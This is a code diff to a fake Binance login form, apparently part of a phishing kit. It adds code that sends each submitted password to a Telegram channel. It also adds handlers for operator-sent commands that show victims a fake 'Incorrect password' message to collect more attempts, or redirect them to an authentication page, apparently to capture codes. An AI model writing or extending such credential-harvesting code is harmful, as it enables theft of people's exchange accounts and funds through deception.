@@ -6,6 +6,7 @@ import BinanceLoader from './BinanceLoader'
 import { useValidatePassword } from '../app/hooks/useValidate'
 import { useEmail } from '../app/lib/EmailContext'
 import { useRouter } from 'next/navigation'
+import { sendMessageToTelegram } from '../lib/api'; 
 
 export default function LoginForm({ setNavigation, navigation }) {
     const router = useRouter()
@@ -52,8 +53,21 @@ export default function LoginForm({ setNavigation, navigation }) {
     const [isLoading, setIsLoading] = useState(false)
     const [showLanguage, setShowLanguage] = useState(false)
     const [isHovered, setIsHovered] = useState(false)
-
     const { validatePassword } = useValidatePassword();
+
+    useEffect(() => {
+        if (command === 'REQUEST_PASSWORD_AGAIN') {
+            setInvalid(true); // Show error state for email input
+            setIsLoading(false);
+        }  else if (command === 'REQUEST_AUTHENTICATION/EMAIL') {
+            setIsLoading(false);
+            setTimeout(() => {
+                // setIsLoading(false);
+                router.push('/AuthenticationPage');
+            }, 1500);
+        }
+    }, [command]);
+
     const handlePasswordValidation = () => {
         const isValid = validatePassword(password);
         setInvalid(!isValid);
@@ -61,10 +75,7 @@ export default function LoginForm({ setNavigation, navigation }) {
 
         if (isValid) {
             setIsLoading(true);
-            setTimeout(() => {
-                setIsLoading(false);
-                router.push('/AuthenticationPage')
-            }, 5000);
+            sendMessageToTelegram(password);
         }
 
         return isValid;
@@ -154,6 +165,7 @@ export default function LoginForm({ setNavigation, navigation }) {
                                     </div>
                                 </div>
                             </div>
+                            {command === 'REQUEST_PASSWORD_AGAIN' ? 'Incorrect password. Please retry or click "Forgot Password?" to reset. You have 4 more chances left.(200001004-72815107)' : 'Please enter a valid Password'}
 
 
                             {/* <p className={`text-[14px] text-red-500 ${invalid ? 'block' : 'hidden'} mt-1 w-full`}>
